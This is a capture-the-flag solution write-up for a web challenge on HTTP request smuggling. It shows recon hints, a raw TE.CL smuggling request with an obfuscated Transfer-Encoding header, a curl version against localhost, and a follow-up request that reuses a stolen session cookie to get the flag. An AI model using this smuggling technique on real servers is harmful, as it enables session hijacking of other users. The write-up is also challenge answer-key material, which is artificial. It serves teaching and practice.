# How to Solve the Challenge?

> Note:
Using Burp Suite and its extensions will make solving this challenge easier.

### Recon

Browse endpoints, any endpoint that does not actually exist will return 404 with thee following message: **If you are trying to reach /post/transmission, you are on the right track but you can't get there from here, nice try :), otherwise you are lost.**. This will give away the first hint, that the endpoint that players should deliver a request to is transmission.

Using the the above hint and theone  found in the transmission section i.e. The payload of a transmission looks like this: **postId=2&name=string&transmission=string** formulate a POST request to /transmission as such:

```http
POST /post/transmission HTTP/1.1
Host: HOST:PORT
Content-Length: 46

postId=2&name=attacker&transmission=iamgroot
```

This will return the same 404 as above.

From the description of the challenge players should be curious if this setup is vulnerable to HTTP request smuggling, especially
TE.CL mismatch.

An **optional** step to verify this assumption would be to use the HTTP Request Smuggler plugin by Burp Suite and launch an attack
on the /transmission endpoint by right clicking on the POST request in Burp Repeater -> Select Extensions -> HTTP Request Smuggler -> Smuggle probe

### Exploit

To solve the challenge, an HTTP request should be smuggled to the backend by abusing a TE.CL mismatch, the exploit can performed as seen below: (if it is done using BurpSuite Repeater, "Update Content-Length" should be turned off, also very important to have an new line after the 0)

```http
GET /post/main HTTP/1.1
Host: HOST:PORT
Transfer-Encoding: containschunked
Content-Length: 4

7e
POST /post/transmission HTTP/1.1
Host: HOST:PORT
Content-Length: 46

postId=2&name=attacker&transmission=iamgroot


0

```

After performing the above request a transmission would be posted on the webpage, this transmission will include a session cookie, when this session cookie is attached to a GET request for /profile the flag will be revealed, the request can look like this:

```http
GET /profile HTTP/1.1
Host: HOST:PORT
Cookie: session=value
```

### Note: 
> The solution may vary (not conceptually, but technically):
> - The value of the Transfer-Encoding header may be different such as "asdchunked" or "1chunked" or any variation as long as it contains the word chunked.
> - The chunk length varies according to the content of the smuggled request.


# HUGO CURL SOLVE:

### SMUGGLING
```
curl -X GET "http://localhost:8002/post/main" \
    -H "Host: HOST:PORT" \
    -H "Transfer-Encoding: containschunked" \
    -H "Content-Length: 4" \
    --data-binary $'75\r\nPOST /post/transmission HTTP/1.1\r\nHost: HOST:PORT\r\nContent-Length: 46\r\n\r\npostId=2&name=attacker&transmission=iamgroot\r\n0\r\n\r\n'
```

### Profile flag
```
curl -X GET "http://localhost:8002/profile" \
    -H "Cookie: session=89bf520e29c9926597eb4669037b6f2e"
```